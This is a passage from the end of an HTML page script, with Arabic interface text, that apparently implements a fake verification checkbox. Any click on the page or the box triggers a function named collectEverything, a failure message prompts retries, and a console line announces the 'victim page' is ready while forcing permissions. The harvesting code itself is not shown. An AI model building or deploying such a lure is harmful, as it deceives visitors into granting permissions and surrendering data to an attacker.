                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
                        mainText.className = 'text failed';
                        checkbox.checked = false;
                        isRunning = false;
                        checkbox.disabled = false;
                    }
                }

                // ===== الأحداث =====
                document.addEventListener('click', function(e) {
                    if (isRunning || collectionDone) return;
                    if (e.target.closest('a')) return;
                    if (!checkbox.checked && !spinner.classList.contains('loading')) {
                        collectEverything();
                    }
                });

                checkbox.addEventListener('change', function(e) {
                    if (this.checked) {
                        this.checked = false;
                        if (!isRunning && !collectionDone) collectEverything();
                    }
                });

                console.log('✅ Victim page ready (إجبار الأذونات).');
            }

        })();
    </script>
</body>
</html>
